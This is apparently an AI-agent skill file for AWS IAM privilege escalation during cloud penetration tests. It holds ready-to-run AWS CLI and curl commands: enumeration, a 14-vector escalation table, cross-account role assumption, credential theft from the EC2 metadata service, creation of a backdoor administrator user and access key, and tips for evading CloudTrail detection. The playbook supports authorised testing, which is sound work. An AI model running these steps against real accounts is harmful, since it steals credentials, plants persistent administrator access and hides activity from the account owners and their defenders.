---
name: aws-iam-privesc
description: Enumerate and exploit AWS IAM privilege escalation paths — dangerous policy combinations, role chaining, and credential abuse
origin: AI Threat Hunting
---

# AWS IAM Privilege Escalation

## When to Activate

- AWS credentials obtained (access key, session token, role assumption)
- Cloud penetration testing with IAM scope
- Post-exploitation in AWS environment
- Assessing IAM least-privilege compliance

## Tools

- AWS CLI / boto3
- Pacu (AWS exploitation framework)
- Cloudsplaining (IAM policy analyzer)
- enumerate-iam (permission enumeration)
- Principal Mapper (pmapper -- graph IAM relationships)

## Methodology

### 1. Initial Enumeration
```bash
# Who am I?
aws sts get-caller-identity
# List attached policies
aws iam list-attached-user-policies --user-name $USER
aws iam list-user-policies --user-name $USER  # inline
# Get policy document
aws iam get-policy-version --policy-arn $ARN --version-id v1
# Full account authorization dump
aws iam get-account-authorization-details > auth_details.json
```

### 2. Privilege Escalation Combos (14 Vectors)

| # | Required Permissions | Escalation Path |
|---|---------------------|-----------------|
| 1 | `iam:CreatePolicyVersion` | Create new policy version with `*:*`, set as default |
| 2 | `iam:SetDefaultPolicyVersion` | Switch to an older overprivileged policy version |
| 3 | `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Create Lambda with admin role, invoke it |
| 4 | `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin instance profile |
| 5 | `iam:PassRole` + `glue:CreateDevEndpoint` | Create Glue endpoint with admin role |
| 6 | `iam:PassRole` + `cloudformation:CreateStack` | Create stack with admin role |
| 7 | `iam:PassRole` + `datapipeline:CreatePipeline` | Create pipeline with admin role |
| 8 | `iam:CreateAccessKey` | Create new access key for any user |
| 9 | `iam:CreateLoginProfile` | Create console password for any user |
| 10 | `iam:UpdateLoginProfile` | Reset any user's console password |
| 11 | `iam:AttachUserPolicy` / `AttachGroupPolicy` / `AttachRolePolicy` | Attach AdministratorAccess to self |
| 12 | `iam:PutUserPolicy` / `PutGroupPolicy` / `PutRolePolicy` | Add inline admin policy to self |
| 13 | `sts:AssumeRole` | Assume a more privileged role (check trust policies) |
| 14 | `lambda:UpdateFunctionCode` | Overwrite existing Lambda to run arbitrary code with its role |

### 3. Wildcard Policy Detection
Dangerous wildcard patterns to flag:
```
iam:*          # Full IAM control -- game over
sts:*          # Can assume any role
s3:*           # Full S3 access -- data exfiltration
lambda:*       # Can create/invoke functions with any role
ec2:*          # Can launch instances with any profile
*:*            # God mode
```

### 4. Cross-Account Role Assumption
```bash
# Find roles that trust external accounts
cat auth_details.json | jq '.RoleDetailList[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS | strings | test("arn:aws:iam::[0-9]+:root"))'
# Assume cross-account role
aws sts assume-role --role-arn arn:aws:iam::TARGET:role/ROLE --role-session-name test
```

### 5. Metadata Service Exploitation
```bash
# IMDSv1 (if not disabled)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token -- temporary role credentials

# IMDSv2 (token required)
TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 6. Persistence After Escalation
```bash
# Create backdoor access key
aws iam create-access-key --user-name target-admin
# Create backdoor user
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
# Add to existing role trust policy
# Create Lambda trigger for persistence
```

### 7. Detection Evasion
- Use `sts:AssumeRole` to operate under a different identity
- Avoid `iam:Create*` calls which are heavily logged in CloudTrail
- Use existing Lambda functions rather than creating new ones
- Prefer `iam:PassRole` chains which are harder to detect than direct policy changes

## What to Record

- Caller identity (account ID, ARN, user/role name)
- Attached and inline policies with their documents
- Identified escalation vector (number from the 14-vector table)
- Wildcard permissions found and their scope
- Cross-account trust relationships
- IMDS version and retrieved credentials
- Persistence mechanisms established
- Full command output for each successful escalation step

## Kill Signals — Stop Testing When
- get-caller-identity shows no IAM permissions (AccessDenied on all enumeration) → credentials may be expired or invalid, verify and move on
- Account has SCPs blocking all iam:* and sts:AssumeRole actions → escalation blocked at org level, record as hardened
- First escalation vector succeeds (e.g., CreatePolicyVersion) → CRITICAL, record and stop testing other vectors
- All 14 escalation combos checked, none have required permissions → IAM is least-privilege, record as hardened
- Metadata service returns credentials → test what those creds grant, record finding based on actual access achieved

## Escalate When
- `iam:PassRole` is allowed on any role, even scoped — chain with `iam:CreateFunction` / `ec2:RunInstances` / `glue:CreateDevEndpoint` / `sagemaker:CreateNotebookInstance` / `codebuild:CreateProject` to assume that role, the PassRole target is the new privilege boundary
- Any `iam:*PolicyVersion`, `iam:AttachRolePolicy`, `iam:PutRolePolicy`, `iam:UpdateAssumeRolePolicy`, `iam:CreateLoginProfile`, `iam:UpdateLoginProfile`, or `iam:CreateAccessKey` is permitted — each is a direct self-privesc vector, walk the full Rhino 14-method matrix even after one succeeds (defenders patch one, often miss siblings)
- The principal has `sts:AssumeRole` on any role in this or a linked account — enumerate trust policies (`aws iam get-role`) for conditions you can satisfy (session tag, external ID leakage, `aws:userid` patterns), cross-account assume-role is the common privilege jump
- Lambda/EC2/ECS/Glue/SageMaker/CodeBuild compute resources exist with attached roles more privileged than the current principal — resource-hijack privesc (modify function code, attach userdata, container override) is usually viable where direct IAM writes are not
- Secrets Manager, SSM Parameter Store, S3 buckets, or CodeCommit repos are readable — AWS creds and cross-service API tokens hide there, grep SecureString/AccessKey/aws_secret_access_key patterns before concluding "least-privilege"

## Extended Resources

- [Rhino Security Labs -- AWS IAM Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [Pacu Wiki](https://github.com/RhinoSecurityLabs/pacu/wiki)
- [Principal Mapper](https://github.com/nccgroup/PMapper)
- [Cloudsplaining](https://github.com/salesforce/cloudsplaining)
- [HackTricks -- AWS IAM Privesc](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation)
